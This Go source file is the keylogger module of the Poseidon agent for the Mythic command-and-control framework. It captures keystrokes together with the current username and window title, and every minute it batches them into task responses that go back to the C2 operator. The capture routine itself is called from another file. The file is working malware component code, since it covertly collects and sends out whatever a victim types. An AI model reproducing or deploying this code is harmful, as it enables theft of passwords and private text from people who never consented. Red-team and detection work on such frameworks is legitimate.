package keystate

import (
	// Standard
	"encoding/json"
	"errors"
	"fmt"
	"os/user"
	"sync"
	"time"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

var (
	curTask *structs.Task
	// Struct to monitor keystrokes.
	ksmonitor, _ = NewKeyLog()
	// Maps strings to their shift counter-parts on US keyboards.
	shiftMap = map[string]string{
		"a":  "A",
		"b":  "B",
		"c":  "C",
		"d":  "D",
		"e":  "E",
		"f":  "F",
		"g":  "G",
		"h":  "H",
		"i":  "I",
		"j":  "J",
		"k":  "K",
		"l":  "L",
		"m":  "M",
		"n":  "N",
		"o":  "O",
		"p":  "P",
		"q":  "Q",
		"r":  "R",
		"s":  "S",
		"t":  "T",
		"u":  "U",
		"v":  "V",
		"w":  "W",
		"x":  "X",
		"y":  "Y",
		"z":  "Z",
		"1":  "!",
		"2":  "@",
		"3":  "#",
		"4":  "$",
		"5":  "%",
		"6":  "^",
		"7":  "&",
		"8":  "*",
		"9":  "(",
		"0":  ")",
		"-":  "_",
		"=":  "+",
		"[":  "{",
		"]":  "}",
		"\\": "|",
		";":  ":",
		"'":  "\"",
		",":  "<",
		".":  ">",
		"/":  "?",
		"`":  "~",
	}
)

type KeyLogWithMutex struct {
	User        string `json:"user"`
	WindowTitle string `json:"window_title"`
	Keystrokes  string `json:"keystrokes"`
	mtx         sync.Mutex
}

func (k *KeyLogWithMutex) AddKeyStrokes(s string) {
	k.mtx.Lock()
	k.Keystrokes += s
	k.mtx.Unlock()
}

func (k *KeyLogWithMutex) ToSerialStruct() structs.Keylog {
	return structs.Keylog{
		User:        k.User,
		WindowTitle: k.WindowTitle,
		Keystrokes:  k.Keystrokes,
	}
}

func (k *KeyLogWithMutex) SetWindowTitle(s string) {
	k.mtx.Lock()
	k.WindowTitle = s
	k.mtx.Unlock()
}

func (k *KeyLogWithMutex) SendMessage() {
	serMsg := ksmonitor.ToSerialStruct()
	msg := structs.Response{}
	msg.TaskID = curTask.TaskID
	keylogs := make([]structs.Keylog, 0, 1)
	msg.Keylogs = &keylogs
	data, err := json.MarshalIndent(serMsg, "", "    ")
	//log.Println("Sending across the wire:", string(data))
	if err != nil {
		msg.UserOutput = err.Error()
		msg.Status = "error"
		msg.Completed = true
		curTask.Job.SendResponses <- msg
	} else {
		profiles.TaskResponses = append(profiles.TaskResponses, data)
	}
}

func NewKeyLog() (KeyLogWithMutex, error) {
	curUser, err := user.Current()
	if err != nil {
		return KeyLogWithMutex{}, err
	}
	return KeyLogWithMutex{
		User:        curUser.Username,
		WindowTitle: "",
		Keystrokes:  "",
	}, nil
}

func StartKeylogger(task structs.Task) error {
	// This function is responsible for dumping output.
	if curTask != nil {
		return errors.New(fmt.Sprintf("Keylogger already running with task ID: %s", curTask.TaskID))
	}
	curTask = &task
	go func() {
		for {
			timer := time.NewTimer(time.Minute)
			<-timer.C
			if ksmonitor.Keystrokes != "" {
				ksmonitor.mtx.Lock()
				ksmonitor.SendMessage()
				ksmonitor.Keystrokes = ""
				ksmonitor.mtx.Unlock()
			}
			if task.ShouldStop() {
				msg := structs.Response{}
				msg.TaskID = curTask.TaskID
				msg.UserOutput = "Keylogging stopped"
				task.Job.SendResponses <- msg
				curTask = nil
				break
			}
		}
	}()
	err := keyLogger()
	return err
}
